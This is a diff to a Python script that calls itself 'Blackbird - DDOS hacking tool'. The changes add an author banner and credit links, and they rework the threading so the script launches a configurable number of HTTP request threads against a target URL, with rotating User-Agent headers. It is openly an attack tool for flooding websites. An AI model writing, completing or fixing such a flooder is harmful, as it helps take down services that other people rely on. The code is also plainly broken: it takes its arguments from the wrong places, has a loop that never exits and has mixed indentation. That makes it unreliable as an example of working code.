@@ -1,3 +1,11 @@
+#-----------------------------------
+#
+#Blackbird - DDOS hacking tool
+#
+#Author - Alpha
+#-----------------------------------
+
+
 import urllib.request
 import threading
 import re
@@ -6,7 +14,6 @@ import sys
 from time import sleep
 
 url=sys.argv[0]
-threading_usages=input('How much threads > ')
 headers_referers=[]
 user_agent=[]
 headers={}
@@ -2947,9 +2954,13 @@ def usage():
 if sys.argv[0]=='-h':
 	usage()
 
+if sys.argv[0]=='credit':
+	print('github : https://github.com/NotFoundHacker')
+	print('youtube : https://www.youtube.com/channel/UC_tN73NX_750otcFUpqtaNw')
+
 def trang():
   while True:
-    sleep(10)
+    sleep(5)
     userAgentCHoose=random.choices(user_agent)
     
   headers['User-Agent']=userAgentCHoose
@@ -2957,15 +2968,15 @@ def trang():
   thrill=urllib.request.urlopen(req)
 	
 def trang_send():
-	for i in range(threading_usages):
+	for i in range(sys.argv[1]):
 		get_attack=threading.Thread(target=request_attack)
 	    	get_attack.start()
 
 	while True:
-		if threading.active_count() < threading_usages:
+		if threading.active_count() < sys.argv[1]:
 	      		get_attack=threading.Thread(target=request_attack)
 	      		get_attack.start()
 
 if __name__=="__main__":
-	sending_attk
+	trang_send()
 
